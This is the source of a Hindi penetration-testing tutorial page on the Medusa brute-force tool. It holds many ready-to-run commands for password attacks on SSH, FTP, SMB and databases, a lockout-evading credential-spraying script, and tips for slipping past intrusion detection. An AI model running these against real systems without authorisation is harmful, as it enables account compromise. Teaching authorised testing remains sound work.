        <li><strong className="text-white">IDS/IPS:</strong> Snort या Suricata से ब्रूट फोर्स पैटर्न डिटेक्ट करो — रियल-टाइम अलर्ट मिलेंगे</li>
        <li><strong className="text-white">पोर्ट नॉन-स्टैंडर्ड:</strong> SSH को 22 के बजाय किसी और पोर्ट पर चलाओ — स्कैनर्स को धोखा दो</li>
        <li><strong className="text-white">नेटवर्क सेगमेंटेशन:</strong> क्रिटिकल सर्वर्स को अलग VLAN में रखो — लैटरल मूवमेंट रोको</li>
        <li><strong className="text-white">लॉग मॉनिटरिंग:</strong> ELK Stack या Splunk से रियल-टाइम अलर्ट — हर फेल्ड अटेम्प्ट पर नज़र</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        Medusa प्रैक्टिस के लिए सेफ लैब बनाओ — असली नेटवर्क पर बिना परमिशन के टेस्ट मत करो।
      </p>
      <CodeBlock
        title="प्रैक्टिस लैब सेटअप"
        code={`# Metasploitable2 VM डाउनलोड करें:
# https://sourceforge.net/projects/metasploitable/
# Username: msfadmin / Password: msfadmin

# SSH ब्रूट फोर्स प्रैक्टिस:
medusa -h 192.168.1.100 -u msfadmin -P wordlist.txt -M ssh

# FTP ब्रूट फोर्स प्रैक्टिस:
medusa -h 192.168.1.100 -u msfadmin -P wordlist.txt -M ftp

# Docker हनीपॉट:
docker run -d -p 2222:22 --name ssh-honeypot linuxserver/openssh-server

# Medusa से हनीपॉट टेस्ट:
medusa -h 127.0.0.1 -u root -P passwords.txt -M ssh -n 2222

# कई सर्विसेज़ एक साथ:
docker run -d -p 21:21 -p 22:22 -p 80:80 --name vuln-server vulnerables/web-dvwa`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="एडवांस्ड तकनीकें"
        code={`# कॉम्बो फाइल से अटैक:
# फॉर्मेट: host:user:password
cat combo.txt
# 192.168.1.100:admin:admin123
# 192.168.1.100:root:toor
# 192.168.1.101:admin:password

medusa -H hosts.txt -C combo.txt -M ssh

# खाली पासवर्ड और यूज़रनेम=पासवर्ड ट्राई करो:
medusa -h target_ip -u admin -P passwords.txt -M ssh -e nsu
# n = नो पासवर्ड (खाली)
# s = यूज़रनेम = पासवर्ड
# u = यूज़रनेम रिवर्स = पासवर्ड

# सभी होस्ट्स पर सभी सर्विसेज़:
for service in ssh ftp http smb mysql; do
  medusa -H hosts.txt -u admin -P passwords.txt -M $service -f
done

# स्टेल्थ मोड (कम थ्रेड्स):
medusa -h target_ip -u admin -P passwords.txt -M ssh -t 1

# वर्डलिस्ट जनरेशन + अटैक:
crunch 8 8 -t @@@@@@@@ -o temp_pass.txt
medusa -h target_ip -u admin -P temp_pass.txt -M ssh -t 5`}
      />

      <h2>Wordlist Generation and Management</h2>
      <p>
        ब्रूट फोर्स अटैक की सफलता 90% वर्डलिस्ट क्वालिटी पर डिपेंड करती है। अच्छी वर्डलिस्ट बनाना और मैनेज करना बहुत ज़रूरी है।
      </p>
      <CodeBlock
        title="वर्डलिस्ट जनरेशन"
        code={`# Crunch से कस्टम वर्डलिस्ट बनाओ:
# 8 कैरेक्टर, lowercase + numbers:
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# पैटर्न-बेस्ड (जैसे: admin2024):
crunch 10 10 -t admin@@@@ -o admin_pass.txt
# @ = lowercase, , = uppercase, % = numbers, ^ = symbols

# CeWL से वेबसाइट से वर्डलिस्ट बनाओ:
cewl https://target.com -d 2 -m 5 -w target_words.txt

# Username जनरेशन (नाम से):
# john, admin, root, test, guest, user, administrator
# कंपनी नेम + variations: company, company123, Company@2024

# Crunch से डेट बेस्ड पासवर्ड्स:
crunch 8 8 -t @@@@2024 -o date_based.txt
crunch 10 10 -t @@@@@@1234 -o common_suffix.txt

# Hashcat रूल्स से वर्डलिस्ट बढ़ाओ:
hashcat -r /usr/share/hashcat/rules/best64.rule wordlist.txt --stdout > expanded.txt

# भारतीय कॉन्टेक्स्ट वर्डलिस्ट:
# फ़ोन नंबर पैटर्न: 98XXXXXXXX, 99XXXXXXXX
# नाम + साल: rahul1990, priya2024, amit@123
# कंपनी + क्रेडेंशियल्स: tcs123, infosys@2024`}
      />

      <h2>Credential Spraying</h2>
      <p>
        क्रेडेंशियल स्प्रेइंग एक एडवांस्ड तकनीक है जहाँ कम पासवर्ड्स को कई यूज़र्स पर ट्राई करते हैं। यह एकाउंट लॉकआउट से बचने का सबसे अच्छा तरीका है।
      </p>
      <CodeBlock
        title="क्रेडेंशियल स्प्रेइंग"
        code={`#!/bin/bash
# क्रेडेंशियल स्प्रेइंग — लॉकआउट से बचो

# कॉमन पासवर्ड्स (कम संख्या में):
COMMON_PASSES="Password1
Summer2024
Welcome1
Company@123
Admin@2024"

# यूज़र्स लिस्ट (ज़्यादा):
USERS="users.txt"  # 100+ यूज़र्स

# हर पासवर्ड को सभी यूज़र्स पर ट्राई करो:
echo "$COMMON_PASSES" | while read pass; do
    echo "[*] पासवर्ड ट्राई: $pass"
    medusa -h target_ip -U $USERS -p "$pass" -M ssh -t 1
    sleep 10  # लॉकआउट से बचने के लिए डिले
done

# भारतीय कॉन्टेक्स्ट कॉमन पासवर्ड्स:
# Password@1, Welcome@123, India@2024
# CompanyName@1, Admin@123, Test@1234
# Season+Year: Summer2024, Winter2024, Spring2024`}
      />

      <h2>Protocol-Specific Attack Details</h2>
      <h3>SSH Attack Details</h3>
      <p>
        SSH सबसे कॉमन टार्गेट है। SSH मॉड्यूल कई वर्जन्स सपोर्ट करता है — SSHv1 और SSHv2 दोनों।
      </p>
      <CodeBlock
        title="SSH एडवांस्ड अटैक"
        code={`# SSH वर्जन डिटेक्ट करो:
nmap -sV -p 22 target_ip

# SSH की-बेस्ड ऑथ चेक (पासवर्ड डिसेबल है?):
ssh -o PreferredAuthentications=none target_ip 2>&1 | grep "auth"

# SSH बैनर ग्रैब:
nc -v target_ip 22

# SSH मॉड्यूल ऑप्शंस:
# -m SSH_VERSION:2 — SSHv2 फोर्स करो
# -m SSH_BANNER:banner — कस्टम बैनर

# SSH हनीपॉट डिटेक्ट (Cowrie, Kippo):
# हनीपॉट्स अक्सर डिफ़ॉल्ट क्रेडेंशियल्स एक्सेप्ट करते हैं
# अगर "admin:admin" काम कर जाए तो हनीपॉट हो सकता है

# SSH बैनर से OS डिटेक्ट:
# SSH-2.0-OpenSSH_8.2p1 Ubuntu — Ubuntu सर्वर
# SSH-2.0-OpenSSH_7.4 — CentOS/RHEL
# SSH-2.0-dropbear — एम्बेडेड डिवाइस`}
      />

      <h3>FTP Attack Details</h3>
      <CodeBlock
        title="FTP एडवांस्ड अटैक"
        code={`# FTP बैनर और वर्जन:
nmap -sV -p 21 target_ip

# FTP एनोनिमस एक्सेस चेक:
ftp target_ip  # username: anonymous, password: anonymous

# FTP मॉड्यूल ऑप्शंस:
# -m FTP_BANNER:banner — कस्टम बैनर
# -m FTP_PASS:password_type — PASS या APPE

# vsftpd 2.3.4 बैकडोर (CVE-2011-2523):
# पोर्ट 6200 पर शेल मिलता है
# Medusa से पहले बैकडोर चेक करो:
nc -v target_ip 6200

# FTP डिफ़ॉल्ट क्रेडेंशियल्स:
# admin:admin, ftp:ftp, anonymous:anonymous
# root:root, test:test, guest:guest

# FTP बैनर से सॉफ्टवेयर पहचानो:
# 220 ProFTPD 1.3.5 — ProFTPD
# 220 vsftpd 2.3.4 — vsftpd
# 220 FileZilla Server — FileZilla`}
      />

      <h3>SMB Attack Details</h3>
      <CodeBlock
        title="SMB एडवांस्ड अटैक"
        code={`# SMB वर्जन डिटेक्ट:
nmap -sV -p 445 target_ip
smbclient -L //target_ip -N

# SMB मॉड्यूल ऑप्शंस:
# -m DOMAIN:WORKGROUP — डोमेन ऑथेंटिकेशन
# -m SMB_VERSION:1 — SMBv1 फोर्स करो

# Windows डिफ़ॉल्ट एकाउंट्स:
# Administrator (अक्सर खाली पासवर्ड)
# Guest (डिसेबल होना चाहिए)
# DefaultAccount, WDAGUtilityAccount

# SMB नल सेशन (एनोनिमस):
smbclient -L //target_ip -N
# अगर काम करे तो एनोनिमस एक्सेस है

# RPC एन्यूमरेशन:
rpcclient -U "" target_ip
# enumdomusers, enumdomgroups, querydominfo

# SMB शेयर्स एन्यूमरेशन:
smbmap -H target_ip
crackmapexec smb target_ip --shares`}
      />

      <h2>Integration with Other Tools</h2>
      <p>
        Medusa को दूसरे टूल्स के साथ इंटीग्रेट करके पावरफुल वर्कफ़्लो बना सकते हो।
      </p>
      <CodeBlock
        title="टूल इंटीग्रेशन"
        code={`#!/bin/bash
# Nmap + Medusa वर्कफ़्लो

# Step 1: Nmap से ओपन पोर्ट्स खोजो:
nmap -sS -p 21,22,23,80,445,3306,3389 target_ip -oX scan.xml

# Step 2: ओपन सर्विसेज़ के आधार पर Medusa चलाओ:
if nmap -p 22 target_ip | grep -q "open"; then
    echo "[+] SSH ओपन है — ब्रूट फोर्स शुरू"
    medusa -h target_ip -U users.txt -P passwords.txt -M ssh -t 5 -f
fi

if nmap -p 21 target_ip | grep -q "open"; then
    echo "[+] FTP ओपन है — ब्रूट फोर्स शुरू"
    medusa -h target_ip -U users.txt -P passwords.txt -M ftp -t 5 -f
fi

# Hydra + Medusa कॉम्बो (एक सर्विस के लिए दोनों):
# Hydra पहले ट्राई करो, फिर Medusa:
hydra -l admin -P passwords.txt target_ip ssh -t 4 -f 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[*] Hydra से नहीं मिला — Medusa ट्राई करते हैं"
    medusa -h target_ip -u admin -P passwords.txt -M ssh -t 5 -f
fi

# Metasploit + Medusa:
# MSF से सर्विसेज़ एन्यूमरेट करो, फिर Medusa से ब्रूट फोर्स:
msfconsole -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS target_ip; run; exit"
medusa -h target_ip -u root -P passwords.txt -M ssh`}
      />

      <h2>Real-World Attack Scenarios</h2>
      <div className="space-y-3 mt-4">
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 1: कॉर्पोरेट नेटवर्क ऑडिट</h4>
          <p className="text-gray-400 text-sm">
            एक कंपनी के 50 सर्वर्स पर SSH ब्रूट फोर्स करना है। पहले Nmap से सभी ओपन SSH पोर्ट्स खोजो, फिर Medusa से -H फ्लैग से सभी होस्ट्स पर एक साथ अटैक करो। कॉमन यूज़रनेम्स (admin, root, test) और डिफ़ॉल्ट पासवर्ड्स ट्राई करो। रिजल्ट्स को CSV में सेव करो।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 2: वेब एप्लिकेशन टेस्टिंग</h4>
          <p className="text-gray-400 text-sm">
            वेब एप्लिकेशन के एडमिन पैनल (/admin, /wp-admin) पर HTTP बेसिक ऑथ ब्रूट फोर्स। Medusa के HTTP मॉड्यूल से -m DIR:/admin ऑप्शन यूज़ करो। वर्डलिस्ट में कॉमन एडमिन पासवर्ड्स रखो: admin, password123, admin@2024।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 3: IoT डिवाइस टेस्टिंग</h4>
          <p className="text-gray-400 text-sm">
            IoT डिवाइसेज (राउटर्स, कैमरा, NAS) पर डिफ़ॉल्ट क्रेडेंशियल्स चेक करना। Telnet (पोर्ट 23) और SSH (पोर्ट 22) पर Medusa यूज़ करो। डिफ़ॉल्ट क्रेडेंशियल्स: admin:admin, root:root, admin:1234, user:user। -e nsu फ्लैग से खाली पासवर्ड भी ट्राई करो।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 4: डेटाबेस सिक्योरिटी ऑडिट</h4>
          <p className="text-gray-400 text-sm">
            MySQL, PostgreSQL, MSSQL डेटाबेस सर्वर्स पर डिफ़ॉल्ट क्रेडेंशियल्स चेक करना। root:root, sa:sa, postgres:postgres जैसे डिफ़ॉल्ट्स ट्राई करो। कस्टम यूज़रनेम लिस्ट बनाओ जिसमें dba, database, admin शामिल हों।
          </p>
        </div>
      </div>

      <h2>Stealth Techniques</h2>
      <p>
        अगर टार्गेट पर IDS/IPS है तो स्टील्दी तरीके से अटैक करना ज़रूरी है। Medusa में कई स्टील्दी तकनीकें हैं।
      </p>
      <CodeBlock
        title="स्टील्दी अटैक तकनीकें"
        code={`# धीमा अटैक (1 थ्रेड, डिले के साथ):
medusa -h target_ip -u admin -P passwords.txt -M ssh -t 1

# होस्ट्स को रोटेट करो (एक ही होस्ट पर लगातार मत भेजो):
#!/bin/bash
for ip in $(shuf -n 10 hosts.txt); do
    medusa -h $ip -u admin -P passwords.txt -M ssh -t 1 -f
    sleep $((RANDOM % 30 + 10))  # 10-40 सेकंड रैंडम डिले
done

# स्मॉल वर्डलिस्ट (कम अटेम्प्ट्स):
head -100 passwords.txt > small_list.txt
medusa -h target_ip -u admin -P small_list.txt -M ssh -t 1

# कस्टम पोर्ट (डिफ़ॉल्ट पोर्ट से हटकर):
medusa -h target_ip -u admin -P passwords.txt -M ssh -n 2222

# सोर्स पोर्ट स्पूफिंग (iptables से):
sudo iptables -t nat -A POSTROUTING -p tcp --dport 22 \\
  --source 192.168.1.50 -j SNAT --to-source 192.168.1.51-192.168.1.60

# रैंडम यूज़रनेम ऑर्डर:
shuf users.txt > shuffled_users.txt
medusa -h target_ip -U shuffled_users.txt -P passwords.txt -M ssh -t 1`}
      />

      <h2>Error Handling and Debugging</h2>
      <p>
        Medusa में एरर्स और इश्यूज कैसे हैंडल करें — डीबगिंग टिप्स।
      </p>
      <CodeBlock
        title="डीबगिंग"
        code={`# वर्बोज़ मोड (सभी डिटेल्स):
medusa -h target_ip -u admin -P passwords.txt -M ssh -v

# बहुत ज़्यादा वर्बोज़ (डीबग):
medusa -h target_ip -u admin -P passwords.txt -M ssh -vvv

# कनेक्शन टेस्ट (सिर्फ 1 अटेम्प्ट):
medusa -h target_ip -u admin -p password123 -M ssh -v

# मॉड्यूल डीबग:
# /usr/lib/medusa/modules/ में मॉड्यूल फाइल्स चेक करो
ls /usr/lib/medusa/modules/

# कॉमन एरर्स:
# ERROR: Medusa: Error: Module 'xyz' not found
# → मॉड्यूल नाम गलत है, medusa -d से चेक करो

# ERROR: Medusa: Error: Host file not found
# → -H फ्लैग में फाइल पाथ चेक करो

# ERROR: Medusa: Error: Login failed
# → वर्बोज़ मोड (-v) से डिटेल्स देखो

# नेटवर्क डीबग:
# कनेक्टिविटी चेक:
ping -c 3 target_ip
# पोर्ट चेक:
nmap -p 22 target_ip
# फ़ायरवॉल चेक:
sudo iptables -L -n`}
      />

      <h2>Reporting and Documentation</h2>
      <p>
        पेनेट्रेशन टेस्टिंग में रिपोर्टिंग बहुत ज़रूरी है। Medusa के आउटपुट को कैसे डॉक्यूमेंट करें।
      </p>
      <CodeBlock
        title="रिपोर्टिंग"
        code={`# Medusa आउटपुट को फाइल में सेव करो:
medusa -h target_ip -u admin -P passwords.txt -M ssh -v 2>&1 | tee medusa_results.txt

# सिर्फ सक्सेसफुल लॉगिन्स:
medusa -h target_ip -u admin -P passwords.txt -M ssh 2>&1 | grep "SUCCESS" > successes.txt

# JSON फॉर्मेट में कन्वर्ट (jq से):
cat medusa_results.txt | grep "SUCCESS" | \\
  awk '{print "{\"host\":\"$3\",\"user\":\"$5\",\"pass\":\"$7\",\"service\":\"$9\"}"}' | \\
  jq . > results.json

# CSV रिपोर्ट बनाओ:
echo "Host,Username,Password,Service" > report.csv
grep "SUCCESS" medusa_results.txt | \\
  awk -F'[: ]' '{print $3","$5","$7","$9}' >> report.csv

# एग्जीक्यूटिव समरी:
echo "=== Medusa ब्रूट फोर्स रिपोर्ट ===" > summary.txt
echo "टार्गेट: target_ip" >> summary.txt
echo "डेट: $(date)" >> summary.txt
echo "कुल अटेम्प्ट्स: $(wc -l < medusa_results.txt)" >> summary.txt
echo "सक्सेसफुल: $(grep -c SUCCESS medusa_results.txt)" >> summary.txt
echo "सर्विसेज़ टेस्टेड: ssh, ftp, http, smb" >> summary.txt`}
      />

      <h2>Common Mistakes and Best Practices</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'बहुत ज़्यादा थ्रेड्स यूज़ करना', a: '100+ थ्रेड्स से सर्वर क्रैश हो सकता है, फ़ायरवॉल ब्लॉक कर देगा, और एकाउंट लॉक हो जाएगा। 3-10 थ्रेड्स से शुरू करो।' },
          { q: 'गलत वर्डलिस्ट यूज़ करना', a: 'बड़ी वर्डलिस्ट हमेशा बेहतर नहीं होती। कस्टम वर्डलिस्ट बनाओ जो टार्गेट के कॉन्टेक्स्ट से रिलेटेड हो।' },
          { q: 'लॉग नहीं चेक करना', a: 'Medusa का आउटपुट हमेशा सेव करो। बाद में एनालिसिस के लिए ज़रूरी है।' },
          { q: 'डिफ़ॉल्ट क्रेडेंशियल्स भूल जाना', a: 'पहले -e nsu फ्लैग से खाली पासवर्ड और यूज़रनेम=पासवर्ड ट्राई करो। अक्सर यही काम कर जाते हैं।' },
          { q: 'एक ही वर्डलिस्ट सब पर', a: 'हर सर्विस के लिए अलग वर्डलिस्ट बनाओ। SSH के लिए लिनक्स पासवर्ड्स, HTTP के लिए वेब पासवर्ड्स।' },
          { q: 'रेट लिमिटिंग नहीं', a: 'iptables या tc से रेट लिमिट लगाओ। फ़ायरवॉल ब्लॉक से बचो।' },
          { q: 'स्टील्दी नहीं होना', a: 'IPS/IDS डिटेक्ट कर लेगा। थ्रेड्स कम रखो, डिले बढ़ाओ, IP रोटेट करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">❌ {item.q}</h4>
            <p className="text-gray-400 text-sm">✅ {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Medusa vs Hydra कौन सा बेहतर है?', a: 'दोनों का अपना यूज़ केस है। Hydra ज़्यादा प्रोटोकॉल्स सपोर्ट करता है और स्टेबल है। Medusa मल्टी-होस्ट स्कैनिंग में तेज़ है और कनेक्शन आइसोलेशन के कारण विश्वसनीय है। सिंगल होस्ट के लिए Hydra, कई होस्ट्स के लिए Medusa।' },
          { q: 'क्या Medusa Windows पर चलता है?', a: 'नहीं, Medusa Linux/Unix पर चलता है। Windows पर यूज़ करने के लिए VM में Kali Linux इंस्टॉल करो।' },
          { q: 'कितने थ्रेड्स यूज़ करने चाहिए?', a: 'सर्वर पर डिपेंड करता है। SSH के लिए 5-10 सेफ है, HTTP के लिए 20-50 ट्राई कर सकते हो। ज़्यादा थ्रेड्स से सर्वर क्रैश हो सकता है या फ़ायरवॉल ब्लॉक कर देगा।' },
          { q: 'क्या Medusa एन्क्रिप्टेड पासवर्ड्स क्रैक कर सकता है?', a: 'नहीं, Medusa ऑनलाइन ब्रूट फोर्स टूल है — लॉगिन अटेम्प्ट्स करता है। ऑफलाइन पासवर्ड क्रैकिंग के लिए Hashcat या John the Ripper यूज़ करो।' },
          { q: 'क्या Medusa पकड़ा जा सकता है?', a: 'हाँ, IDS/IPS और Fail2Ban से आसानी से डिटेक्ट होता है। लॉग मॉनिटरिंग से भी पता चल जाता है। धीमा और स्टील्दी अटैक के लिए थ्रेड्स कम करो।' },
          { q: 'मल्टी-होस्ट अटैक कैसे करें?', a: '-H फ्लैग से होस्ट्स फाइल दो (एक IP प्रति लाइन)। -T फ्लैग से कुल पैरलल कनेक्शंस सेट करो।' },
          { q: 'कॉम्बो फाइल क्या है?', a: 'कॉम्बो फाइल में host:user:password फॉर्मेट में क्रेडेंशियल्स होते हैं। -C फ्लैग से स्पेसिफाई करो। यह तब यूज़फुल है जब आपके पास पहले से कुछ क्रेडेंशियल्स हों।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Hydra</td><td className="py-2 px-3">नेटवर्क लॉगिन ब्रूट फोर्स</td><td className="py-2 px-3">50+ प्रोटोकॉल्स, सबसे पॉपुलर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Ncrack</td><td className="py-2 px-3">नेटवर्क ऑथेंटिकेशन क्रैकिंग</td><td className="py-2 px-3">Nmap टीम ने बनाया</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Patator</td><td className="py-2 px-3">पायथन-बेस्ड ब्रूट फोर्स</td><td className="py-2 px-3">मॉड्यूलर, कस्टमाइज़ेबल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CrackMapExec</td><td className="py-2 px-3">Windows नेटवर्क एक्सप्लॉइटेशन</td><td className="py-2 px-3">AD एनवायरनमेंट के लिए बेस्ट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Crowbar</td><td className="py-2 px-3">SSH की-बेस्ड अटैक</td><td className="py-2 px-3">SSH प्राइवेट की ब्रूट फोर्स</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Hydra-GTK</td><td className="py-2 px-3">Hydra का GUI वर्जन</td><td className="py-2 px-3">ग्राफ़िकल इंटरफ़ेस</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside mt-2 space-y-1">
          <li>Hydra काम नहीं कर रहा या स्लो है तो Medusa ट्राई करो — कनेक्शन आइसोलेशन बेहतर है</li>
          <li>मल्टी-होस्ट स्कैनिंग के लिए Medusa सबसे अच्छा है — -H फ्लैग से होस्ट्स फाइल दो</li>
          <li>वर्डलिस्ट क्वालिटी सबसे ज़रूरी है — rockyou.txt से कस्टम वर्डलिस्ट बेहतर है, CeWL से बनाओ</li>
          <li>थ्रेड्स 3-10 के बीच रखो — ज़्यादा से सर्वर क्रैश या फ़ायरवॉल ब्लॉक</li>
          <li>-f फ्लैग यूज़ करो ताकि पहला वैलिड पासवर्ड मिलने पर रुक जाए</li>
          <li>-e nsu फ्लैग से खाली पासवर्ड और यूज़रनेम=पासवर्ड भी ट्राई होते हैं</li>
          <li>Fail2Ban से प्रोटेक्टेड सर्वर्स पर धीमा अटैक करो — स्टील्दी रहो, IP रोटेशन करो</li>
          <li>हमेशा लैब एनवायरनमेंट में प्रैक्टिस करो पहले — Metasploitable2 और DVWA सबसे अच्छे हैं</li>
          <li>रिजल्ट्स हमेशा सेव करो — बाद में रिपोर्टिंग और एनालिसिस के लिए ज़रूरी है</li>
          <li>कॉम्बो फाइल (-C) यूज़ करो जब पहले से कुछ क्रेडेंशियल्स पता हों</li>
          <li>SSH के लिए -m SSH_VERSION:2 फ्लैग से SSHv2 फोर्स करो — ज़्यादा सिक्योर और तेज़ है</li>
          <li>SMB अटैक में -m DOMAIN:WORKGROUP से डोमेन ऑथेंटिकेशन ट्राई करो — डोमेन एडमिन मिल सकता है</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> ब्रूट फोर्स अटैक्स सर्वर पर हैवी लोड डालते हैं। लॉकआउट पॉलिसीज़ ट्रिगर हो सकती हैं। हमेशा अधिकृत परमिशन के साथ ही टेस्ट करो। रेट लिमिटिंग और IP ब्लॉकिंग से बचने के लिए थ्रेड्स कंट्रोल में रखो। सब कुछ डॉक्यूमेंट करो। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत ब्रूट फोर्स अपराध हो सकता है। सभी रिजल्ट्स को एन्क्रिप्टेड रखो और अधिकृत लोगों के साथ ही शेयर करो।
      </div>
    </TutorialLayout>
  )
}
